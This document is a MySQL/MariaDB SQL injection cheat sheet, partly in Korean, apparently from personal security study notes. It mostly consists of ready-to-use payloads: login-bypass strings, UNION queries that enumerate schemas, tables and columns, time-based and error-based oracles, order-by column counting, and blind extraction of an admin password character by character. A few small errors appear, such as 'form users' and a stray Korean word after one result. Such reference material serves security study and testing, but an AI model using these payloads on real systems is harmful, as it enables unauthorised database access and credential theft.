# SQL injection

### Express string   
select admin;   
select 'ad''min'; -> ad'min   
select 'ad' 'min'; -> admin   
select 0x6162; -> ab   
select char(0x61, 0x62); -> ab   
select 0b110000101100010; -> ab   
select concat(char(0x61),char(0x62)); -> ab   
select mid(@@version,12,1); -> n 가젯   
select unhex(unhex(36313632)); -> ab   
<hr>

### Useful Functions
* string   
  * substring(), substr(), mid() # select mid('admin',3,2); -> mi   
  * left() # select left('admin',2); -> ad
  * right() # select right('admin',2); -> in
  * concat() # select concat('ad','min'); -> admin
  * group_concat() # select group_concat('ad','min'); -> admin
  * instr() # select instr('hi\~\~! hello!!!','hello'); -> 7
  * length() # select length('hello!'); -> 6
  * lpad() # select lpad('admin',1,1)='a'; -> TRUE
  * rpad() # select rpad('admin',1,1)='a'; -> True
  * ord() # select ord('a'); -> 97
  * ascii() # select ascii('a'); -> 97
  * hex() # select hex('a'); -> 0x61
  * char() # select char(0x61); -> a
* typecast
  * convert() # select convert('admin',binary(1)); -> a
  * cast() # select cast('admin' as char(1)); -> a
* etc
  * version() # select version(); -> 5.7.31-0ubuntu0.16.04.1 
  * user() # select user(); -> user@localhost
  * schema(), database() #select schema(); -> database_name
  * sleep() # select sleep(3); -> 1 row in set (3.00 sec)
<hr>

### Basic SQL Injection
'   
' or '1==1'#   
' or '1'='1   
' or 1=1#
<hr>

### Union SQL Injection
union select schema_name from information_schema.schemata;   
union select table_name from information_schema.tables where table_schema="db_schema";   
union select table_name from information_schema.tables where table_schema=database();   
union select column_name from information_schema.columns where table_name="table_name";
<hr>

### Time-based SQL Injection
select 'a'='a' and sleep(1); # 1 row in set (1.00 sec)   
select 'a'='b' and sleep(1); # 1 row in set (0.00 sec)   
select 'a'='a' and benchmark(10000000,md5('a')); // 1 row in set (3.017 sec)   
select 'a'='b' and benchmark(10000000,md5('a')); // 1 row in set (1.565 sec)   
<hr>

### Error-based : Data extraction with error message
select * from users union select foo(); # FUNCTION test.foo does not exist   
select * from users where exp(~id); # DOUBLE value is out of range in 'exp(~\`test\`.\`users\`.\`id\`)'   
select * from users where extractvalue(1,concat(0x3a,version())); #XPATH systax error: '10.4.6-MariaDB'   
<hr>

### Error-based : Blind SQL Injection
서브 쿼리에서 2개 이상의 row를 리턴하면 에러가 발생하는 점을 이용해서 공격   
select if('a'='b',1,(select 1 union select 2)); # error -> Subquery returns more than 1 row
select if('a'='a',1,(select 1 union select 2)); ok   
select case when 1=1 then (select 1 union select 2) else 1 end; # error   
select case when 1=0 then (select 1 union select 2) else 1 end; # ok   

BIGINT overflow   
select ~0+(select 'a'='a'); # error -> ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '~0 + ('a' = 'a')'   
select ~0+(select 'a'='b'); # ok   

cot함수 인자로 False가 들어가면 에러가 발생하는 것을 이용해서 공격
select cot(1=0); # error (DOUBLE value is out of range in 'cot(1 = 0)')   
select cot(1=1); # ok   

order by 뒤에 숫자 늘리면서 에러로 컬럼 수 파악   
select * from users order by \[컬럼 개수\]; # 컬럼 개수 늘려가면서 에러로 개수 파악.  
select * from users order by 1; # ok   
select * from users order by 2; # ok   
select * from users order by 3; # error -> users 테이블의 컬럼 개수는 2개인 것   
<hr>

### Blind SQL Injection
Binary Search   
select * from users where username='admin' and ascii(substr(password,1,1))>79;   
Bit 연산   
select * from users where username='admin' and substr(bin(ord(password)),1,1)=1;   
select * form users where username='admin' and substr(bin(ord(password)),2,1)=1;   
<hr>

### Filter Bypass
[Filter Bypass](https://github.com/zzsla/security/blob/main/cheat_sheet/SQL%20injection/Filter%20Bypass.md)
